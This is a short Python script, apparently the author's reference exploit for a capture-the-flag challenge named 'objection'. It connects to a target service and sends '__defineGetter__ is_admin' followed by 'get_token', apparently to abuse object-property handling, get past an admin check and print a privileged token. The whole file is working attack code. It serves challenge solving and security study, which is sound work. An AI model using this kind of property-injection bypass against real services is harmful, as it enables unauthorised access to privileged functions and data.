#!/usr/bin/env python3
import socket
import sys

# exploit for "objection" by TheJH (challenge author)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))

def expect(bstr):
  resp = s.recv(len(bstr), socket.MSG_WAITALL)
  if resp != bstr:
    print('expected {0}, but got {1}'.format(bstr, resp))
    sys.exit(1)
  print('got {0} as expected'.format(resp))

def dumpline():
  line = b''
  while True:
    char = s.recv(1)
    if len(char) == 0:
      sys.exit(1)
    line += char
    if char == b'\n':
      print(line.decode('ascii'))
      return

expect(b'hello!\n')
s.send(b'__defineGetter__ is_admin\nget_token\n')
expect(b'undefined\n')
dumpline()
